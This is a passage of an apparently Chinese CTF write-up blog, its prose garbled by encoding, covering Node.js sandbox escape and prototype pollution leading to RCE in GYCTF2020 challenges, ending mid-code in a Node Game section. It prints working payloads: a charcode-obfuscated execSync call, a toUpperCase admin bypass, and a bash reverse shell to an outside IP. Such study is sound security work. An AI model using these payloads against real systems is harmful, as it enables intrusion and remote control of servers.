<p>Êàë‰ª¨ÂÖàÊòéÁ°ÆÊàë‰ª¨Ë¶ÅÊâßË°åÁöÑÂëΩ‰ª§ËØ≠Âè•</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;)</span><br></pre></td></tr></table></figure>

<p>Êàë‰ª¨ÂÖàÂ∞ÜËøô‰∏™ËøõË°åËΩ¨Êç¢</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41)</span><br></pre></td></tr></table></figure>

<p>ÂèëÁé∞ÂøÖÈ°ª‰ΩøÁî®<code>Math.</code>  ÁöÑÊ†ºÂºè <code>Math.constructor.constructor</code>Êó†Ê≥ïË¢´ÊûÑÈÄ†ÔºåÈÇ£‰πà<code>Math=Math.constructor,Math.x=Math.constructor</code>Êù•ËøõË°åÈó¥Êé•ÊûÑÈÄ†ÔºåÁÑ∂ÂêéÂÜçÂà©Áî®<code> =&gt;</code>ËøõË°åËá™Ë∞ÉÔºåËøôÊ†∑Êï¥‰∏™payloadÂü∫Êú¨Â∞±ÊòØÂá∫Êù•‰∫Ü</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Math=&gt;(Math=Math.constructor,Math.x=Math.constructor(Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()))(Math+2)</span><br></pre></td></tr></table></figure>



<p>Âó∑ÂØπÔºåËøôÈáåÁ®çÂæÆË¥¥‰∏™<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11791?time__1311=mqmx0DBDcD2Dy7DuDBuQsNqmBD9edeD&alichlgref=https://www.google.com.hk/#toc-10">ÂçöÂÆ¢</a>ÔºåÂØπ‰∫énode.jsË¶ÅÁî®ÁöÑ‰∏úË•øËÆ≤ÁöÑÊØîËæÉÂÖ®</p>
<h2 id="GYCTF2020-Ez-Express"><a href="#GYCTF2020-Ez-Express" class="headerlink" title="[GYCTF2020]Ez_Express"></a>[GYCTF2020]Ez_Express</h2><p>ËøôÈáåËøõÂéªÊ≤°‰ªÄ‰πàÊÄùË∑ØÔºåÊâ´‰∫Ü‰∏Ä‰∏ãÂèëÁé∞ÊúâÊ∫êÁ†Å</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">var express = require(&#x27;express&#x27;);</span><br><span class="line">var router = express.Router();</span><br><span class="line">const isObject = obj =&gt; obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === Object;</span><br><span class="line">const merge = (a, b) =&gt; &#123;</span><br><span class="line">  for (var attr in b) &#123;</span><br><span class="line">    if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;</span><br><span class="line">      merge(a[attr], b[attr]);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return a</span><br><span class="line">&#125;</span><br><span class="line">const clone = (a) =&gt; &#123;</span><br><span class="line">  return merge(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br><span class="line">function safeKeyword(keyword) &#123;</span><br><span class="line">  if(keyword.match(/(admin)/is)) &#123;</span><br><span class="line">      return keyword</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  return undefined</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">router.get(&#x27;/&#x27;, function (req, res) &#123;</span><br><span class="line">  if(!req.session.user)&#123;</span><br><span class="line">    res.redirect(&#x27;/login&#x27;);</span><br><span class="line">  &#125;</span><br><span class="line">  res.outputFunctionName=undefined;</span><br><span class="line">  res.render(&#x27;index&#x27;,data=&#123;&#x27;user&#x27;:req.session.user.user&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.get(&#x27;/login&#x27;, function (req, res) &#123;</span><br><span class="line">  res.render(&#x27;login&#x27;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.post(&#x27;/login&#x27;, function (req, res) &#123;</span><br><span class="line">  if(req.body.Submit==&quot;register&quot;)&#123;</span><br><span class="line">   if(safeKeyword(req.body.userid))&#123;</span><br><span class="line">    res.end(&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;) </span><br><span class="line">   &#125;</span><br><span class="line">    req.session.user=&#123;</span><br><span class="line">      &#x27;user&#x27;:req.body.userid.toUpperCase(),</span><br><span class="line">      &#x27;passwd&#x27;: req.body.pwd,</span><br><span class="line">      &#x27;isLogin&#x27;:false</span><br><span class="line">    &#125;</span><br><span class="line">    res.redirect(&#x27;/&#x27;); </span><br><span class="line">  &#125;</span><br><span class="line">  else if(req.body.Submit==&quot;login&quot;)&#123;</span><br><span class="line">    if(!req.session.user)&#123;res.end(&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;)&#125;</span><br><span class="line">    if(req.session.user.user==req.body.userid&amp;&amp;req.body.pwd==req.session.user.passwd)&#123;</span><br><span class="line">      req.session.user.isLogin=true;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">      res.end(&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">  res.redirect(&#x27;/&#x27;); ;</span><br><span class="line">&#125;);</span><br><span class="line">router.post(&#x27;/action&#x27;, function (req, res) &#123;</span><br><span class="line">  if(req.session.user.user!=&quot;ADMIN&quot;)&#123;res.end(&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;)&#125; </span><br><span class="line">  req.session.user.data = clone(req.body);</span><br><span class="line">  res.end(&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;);  </span><br><span class="line">&#125;);</span><br><span class="line">router.get(&#x27;/info&#x27;, function (req, res) &#123;</span><br><span class="line">  res.render(&#x27;index&#x27;,data=&#123;&#x27;user&#x27;:res.outputFunctionName&#125;);</span><br><span class="line">&#125;)</span><br><span class="line">module.exports = router;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ÁÆÄÂçïÂÆ°ËÆ°‰∏ÄÊ≥¢ÔºåÂèØ‰ª•ÁúãÂà∞ÂæàÊòéÊòæÁöÑÂÆö‰πâ‰∏§‰∏™ÂáΩÊï∞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">const merge = (a, b) =&gt; &#123;</span><br><span class="line">  for (var attr in b) &#123;</span><br><span class="line">    if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;</span><br><span class="line">      merge(a[attr], b[attr]);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return a</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">const clone = (a) =&gt; &#123;</span><br><span class="line">  return merge(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ÁúãÂà∞Ëøô‰∏§‰∏™‰∏úË•øÔºåÂ∞±Âü∫Êú¨ÂèØ‰ª•Á°ÆÂÆöÊòØ‰∏ÄÈÅìÂéüÂûãÈìæÊ±°ÊüìÁöÑÈ¢òÁõÆ‰∫Ü</p>
<p><strong>clone</strong>ÂáΩÊï∞ÂÆûÈôÖ‰∏äÂ∞±ÊòØË∞ÉÁî®<strong>merge</strong>Êù•ÂÆåÊàêÔºåÈÇ£‰πàÊàë‰ª¨‰∏ªË¶ÅÂ∞±ÊòØÊù•Áúã<strong>merge</strong>ÔºåËøêÁî®‰∏Ä‰∏™ÈÄíÂΩíÔºåÂ∞Ü‰∏§‰∏™ÂØπË±°ÂêàÂπ∂ÔºåÂ≠òÂú®ÁöÑÊºèÊ¥ûÁÇπ‰πüÂæàÊòéÊòæ<code>a[attr] = b[attr];</code>ÔºåÊàë‰ª¨ÈÄöËøáÊûÑÈÄ†<strong>attr</strong>‰∏∫**<em>_proto</em>_**Â∞±ÂèØ‰ª•ÂÆûÁé∞ÂéüÂûãÈìæÁöÑÊ±°Êüì‰∫Ü</p>
<p>okÔºåÊòéÁôΩ‰∫ÜÊ±°ÊüìÁÇπÔºåÊàë‰ª¨Êù•ÁúãÂì™ÈáåË∞ÉÁî®Âà∞‰∫ÜËøô‰∏§‰∏™ÂáΩÊï∞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">router.post(&#x27;/login&#x27;, function (req, res) &#123;</span><br><span class="line">  if(req.body.Submit==&quot;register&quot;)&#123;</span><br><span class="line">   if(safeKeyword(req.body.userid))&#123;</span><br><span class="line">    res.end(&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;) </span><br><span class="line">   &#125;</span><br><span class="line">    req.session.user=&#123;</span><br><span class="line">      &#x27;user&#x27;:req.body.userid.toUpperCase(),</span><br><span class="line">      &#x27;passwd&#x27;: req.body.pwd,</span><br><span class="line">      &#x27;isLogin&#x27;:false</span><br><span class="line">    &#125;</span><br><span class="line">    res.redirect(&#x27;/&#x27;); </span><br><span class="line">  &#125;</span><br><span class="line">  else if(req.body.Submit==&quot;login&quot;)&#123;</span><br><span class="line">    if(!req.session.user)&#123;res.end(&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;)&#125;</span><br><span class="line">    if(req.session.user.user==req.body.userid&amp;&amp;req.body.pwd==req.session.user.passwd)&#123;</span><br><span class="line">      req.session.user.isLogin=true;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">      res.end(&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">  res.redirect(&#x27;/&#x27;); ;</span><br><span class="line">&#125;);</span><br><span class="line">router.post(&#x27;/action&#x27;, function (req, res) &#123;</span><br><span class="line">  if(req.session.user.user!=&quot;ADMIN&quot;)&#123;res.end(&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;)&#125; </span><br><span class="line">  req.session.user.data = clone(req.body);</span><br><span class="line">  res.end(&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;);  </span><br><span class="line">&#125;);</span><br><span class="line">router.get(&#x27;/info&#x27;, function (req, res) &#123;</span><br><span class="line">  res.render(&#x27;index&#x27;,data=&#123;&#x27;user&#x27;:res.outputFunctionName&#125;);</span><br><span class="line">&#125;)</span><br><span class="line">module.exports = router;</span><br></pre></td></tr></table></figure>

<p>ÂæàÊòéÊòæÂèØ‰ª•ÁúãÂà∞Âú®**&#x2F;action<strong>ÁöÑË∑ØÁî±‰∏ãË∞ÉÁî®Âà∞‰∫Ü</strong>clone**ÂáΩÊï∞</p>
<p>‰ΩÜÂú®Ëøô‰∏™‰πãÂâçÈúÄË¶ÅÁªïËøá‰∏Ä‰∏™Âà§Êñ≠<code>if(req.session.user.user!=&quot;ADMIN&quot;)&#123;res.end(&quot;&lt;script&gt;alert(&#39;ADMIN is asked&#39;);history.go(-1);&lt;/script&gt;&quot;)&#125; </code>ÊâçËÉΩÊâßË°åÂà∞Êàë‰ª¨ÈúÄË¶ÅÁöÑ<code>req.session.user.data = clone(req.body);</code></p>
<p>ÈÇ£‰πàÊÄùË∑ØÂ∞±Â∑≤ÁªèÊòæËÄåÊòìËßÅ‰∫ÜÔºåÈÄöËøá‰º™ÈÄ†‰∏Ä‰∏™<strong>ADMIN</strong>Ë∫´‰ªΩÔºåÊù•ÊâßË°åÂéüÂûãÈìæÊ±°ÊüìÔºå‰ªéËÄåÈÄ†ÊàêÂëΩ‰ª§ÊâßË°åÁöÑÊïàÊûú</p>
<p>ÈÇ£‰πàÊ±°Êüì‰ªÄ‰πàÂë¢ÔºåËøô‰∏™ÂÖ∂ÂÆûÂæàÂ•ΩÊâæ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">router.get(&#x27;/info&#x27;, function (req, res) &#123;</span><br><span class="line">  res.render(&#x27;index&#x27;,data=&#123;&#x27;user&#x27;:res.outputFunctionName&#125;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>ÊÄé‰πà‰º™ÈÄ†Ëøô‰∏™<strong>ADMIN</strong>Ë∫´‰ªΩÔºåÊòæÁÑ∂‰∏ç‰ºöÊòØÁõ¥Êé•Ëøô‰πàËΩªÊùæ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(safeKeyword(req.body.userid))&#123;</span><br><span class="line">    res.end(&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;) </span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function safeKeyword(keyword) &#123;</span><br><span class="line">  if(keyword.match(/(admin)/is)) &#123;</span><br><span class="line">      return keyword</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  return undefined</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ÂèØ‰ª•ÁúãÂà∞ÂÖ∂ÂÆûÊòØÊúâ‰∏ÄÂ±ÇÂÆâÂÖ®Èò≤Êä§Âú®ÁöÑ</p>
<p>‰ΩÜ‰ªîÁªÜÁúãËøòÊòØ‰ºöÂèëÁé∞ÂÖ∂ÂÆûÂ≠òÂú®‰∏ÄÁÇπÈóÆÈ¢òÔºåJavascriptÊòØ‰∏Ä‰∏™Â§ßÂ∞èÂÜôÊïèÊÑüÁöÑËØ≠Ë®ÄÔºåËôΩÁÑ∂Êàë‰ª¨‰º†ÂÖ•ÁöÑ‰∏çÁÆ°ÊòØÂ§ßÂ∞èÂÜôÈÉΩ‰ºöË¢´Ê£ÄÊµãÔºåÊúÄÂêéÁöÑÊ£ÄÊµãÂç¥Âõ∫ÂÆö‰∏∫<strong>ADMIN</strong>Ôºå‰πüÂ∞±ÊòØËØ¥‰ªñ‰∏≠Èó¥‰∏ÄÂÆöÊòØÂ≠òÂú®‰∏Ä‰∏™Â§ßÂ∞èÂÜôËΩ¨ÂåñÁöÑÊ≠•È™§</p>
<p>‰ªîÁªÜÂÜçÁúã‰∏ÄÈÅçÂ∞±ÂèØ‰ª•ÂèëÁé∞Á´ØÂÄ™<code>&#39;user&#39;:req.body.userid.toUpperCase()</code>.Ëøô‰∏™ÂØπ‰º†ÂÖ•ÁöÑ<strong>userid</strong>ËøõË°å‰∫Ü‰∏Ä‰∏™Â§ßÂ∞èÂÜôËΩ¨ÂåñÔºåÊêú‰∫Ü‰∏Ä‰∏ãÂèëÁé∞ËøôÈáåÂÖ∂ÂÆûÊòØÂ≠òÂú®ÂèØ‰ª•Âà©Áî®ÁöÑÊºèÊ¥ûÁöÑÔºåÊàëÂú®Âè¶‰∏ÄÁØáÊñáÁ´†ÈáåÂ∞±ÂÖ∑‰ΩìÁöÑËÆ∞ÂΩïÔºåËøôÈáåÂ∞±‰∏çÂú®ËøáÁöÑÁöÑËµòËø∞ÔºåÁÆÄÂçïËØ¥‰∏Ä‰∏ã‰ªñÁöÑÂà©Áî®ÊñπÂºè</p>
<blockquote>
<p>toUpperCase‰∏≠Â≠òÂú®‰∏§‰∏™ÁâπÊÆäÁöÑÂ≠óÁ¨¶**‚Äùƒ±‚Äù<strong>„ÄÅ</strong>‚Äú≈ø‚Äù<strong>ÔºåËÄåËøô‰∏§‰∏™ÁöÑÂ§ßÂÜô‰∏∫</strong>I<strong>Âíå</strong>S**Ôºå‰πüÂ∞±ËØ¥ ‚Äúƒ±‚Äù.toUpperCase() &#x3D;&#x3D; ‚ÄòI‚ÄôÔºå‚Äù≈ø‚Äù.toUpperCase() &#x3D;&#x3D; ‚ÄòS‚Äô  ÂèØ‰ª•Áî®ÂÖ∂ÁâπÊÄßÊù•ËøõË°åÁªïËøá</p>
</blockquote>
<p>ËøôÂõûÊÄùË∑ØÂΩªÂ∫ïÊòéÊúó‰∫Ü,ÈÄöËøá<strong>admƒ±n</strong>Êù•‰º™ÈÄ†Ë∫´‰ªΩÔºåÂú®**&#x2F;action**Ë∑ØÁî±‰∏ã‰º†ÂÖ•ËøõË°åÊ±°Êüì</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/47.236.106.198/9000 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>ËÆøÈóÆ**&#x2F;info**Ë∑ØÁî±ÔºåÊâßË°åËøô‰∏™payloadÔºåÂ∞±ÂèØ‰ª•ÂÆûÁé∞ÂèçÂºπshell‰∫Ü</p>
<p>ËøôÈáåËøòÊúâ‰∏™ÊÄùË∑ØÊòØÁõ¥Êé•Âú®**&#x2F;action**Ë∑ØÁî±‰∏ã‰º†ÂÖ•ÂëΩ‰ª§ÊâßË°å</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;lua&quot;:&quot;a&quot;,&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a=1;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;)//&quot;&#125;,&quot;Submit&quot;:&quot;&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>ÂêåÊ†∑Âè™Ë¶ÅËÆøÈóÆ**&#x2F;info**Ë∑ØÁî±Â∞±ÂèØ‰ª•Ëé∑Âæóflag‰∫Ü</p>
<h2 id="GYCTF2020-Node-Game"><a href="#GYCTF2020-Node-Game" class="headerlink" title="[GYCTF2020]Node Game"></a>[GYCTF2020]Node Game</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">var express = require(&#x27;express&#x27;);</span><br><span class="line">var app = express();</span><br><span class="line">var fs = require(&#x27;fs&#x27;);</span><br><span class="line">var path = require(&#x27;path&#x27;);</span><br><span class="line">var http = require(&#x27;http&#x27;);</span><br><span class="line">var pug = require(&#x27;pug&#x27;);</span><br><span class="line">var morgan = require(&#x27;morgan&#x27;);</span><br><span class="line">const multer = require(&#x27;multer&#x27;);</span><br><span class="line"></span><br><span class="line">app.use(multer(&#123;dest: &#x27;./dist&#x27;&#125;).array(&#x27;file&#x27;));</span><br><span class="line">app.use(morgan(&#x27;short&#x27;));</span><br><span class="line">app.use(&quot;/uploads&quot;, express.static(path.join(__dirname, &#x27;/uploads&#x27;)))</span><br><span class="line">app.use(&quot;/template&quot;, express.static(path.join(__dirname, &#x27;/template&#x27;)))</span><br><span class="line"></span><br><span class="line">app.get(&#x27;/&#x27;, function(req, res) &#123;</span><br><span class="line">    var action = req.query.action ? req.query.action : &quot;index&quot;;</span><br><span class="line">    if (action.includes(&quot;/&quot;) || action.includes(&quot;\\&quot;)) &#123;</span><br><span class="line">        res.send(&quot;Errrrr, You have been Blocked&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    file = path.join(__dirname + &#x27;/template/&#x27; + action + &#x27;.pug&#x27;);</span><br><span class="line">    var html = pug.renderFile(file);</span><br><span class="line">    res.send(html);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(&#x27;/file_upload&#x27;, function(req, res) &#123;</span><br><span class="line">    var ip = req.connection.remoteAddress;</span><br><span class="line">    var obj = &#123;</span><br><span class="line">        msg: &#x27;&#x27;,</span><br><span class="line">    &#125;</span><br><span class="line">    if (!ip.includes(&#x27;127.0.0.1&#x27;)) &#123;</span><br><span class="line">        obj.msg = &quot;only admin&#x27;s ip can use it&quot;</span><br><span class="line">        res.send(JSON.stringify(obj));</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    fs.readFile(req.files[0].path, function(err, data) &#123;</span><br><span class="line">        if (err) &#123;</span><br><span class="line">            obj.msg = &#x27;upload failed&#x27;;</span><br><span class="line">            res.send(JSON.stringify(obj));</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            var file_path = &#x27;/uploads/&#x27; + req.files[0].mimetype + &quot;/&quot;;</span><br><span class="line">            var file_name = req.files[0].originalname</span><br><span class="line">            var dir_file = __dirname + file_path + file_name</span><br><span class="line">            if (!fs.existsSync(__dirname + file_path)) &#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    fs.mkdirSync(__dirname + file_path)</span><br><span class="line">                &#125; catch (error) &#123;</span><br><span class="line">                    obj.msg = &quot;file type error&quot;;</span><br><span class="line">                    res.send(JSON.stringify(obj));</span><br><span class="line">                    return</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            try &#123;</span><br><span class="line">                fs.writeFileSync(dir_file, data)</span><br><span class="line">                obj = &#123;</span><br><span class="line">                    msg: &#x27;upload success&#x27;,</span><br><span class="line">                    filename: file_path + file_name</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; catch (error) &#123;</span><br><span class="line">                obj.msg = &#x27;upload failed&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">            res.send(JSON.stringify(obj));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(&#x27;/source&#x27;, function(req, res) &#123;</span><br><span class="line">    res.sendFile(path.join(__dirname + &#x27;/template/source.txt&#x27;));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(&#x27;/core&#x27;, function(req, res) &#123;</span><br><span class="line">    var q = req.query.q;</span><br><span class="line">    var resp = &quot;&quot;;</span><br><span class="line">    if (q) &#123;</span><br><span class="line">        var url = &#x27;http://localhost:8081/source?&#x27; + q</span><br><span class="line">        console.log(url)</span><br><span class="line">        var trigger = blacklist(url);</span><br><span class="line">        if (trigger === true) &#123;</span><br><span class="line">            res.send(&quot;error occurs!&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                http.get(url, function(resp) &#123;</span><br><span class="line">                    resp.setEncoding(&#x27;utf8&#x27;);</span><br><span class="line">                    resp.on(&#x27;error&#x27;, function(err) &#123;</span><br><span class="line">                        if (err.code === &quot;ECONNRESET&quot;) &#123;</span><br><span class="line">                            console.log(&quot;Timeout occurs&quot;);</span><br><span class="line">                            return;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;);</span><br><span class="line">                    resp.on(&#x27;data&#x27;, function(chunk) &#123;</span><br><span class="line">                        try &#123;</span><br><span class="line">                            resps = chunk.toString();</span><br><span class="line">                            res.send(resps);</span><br><span class="line">                        &#125; catch (e) 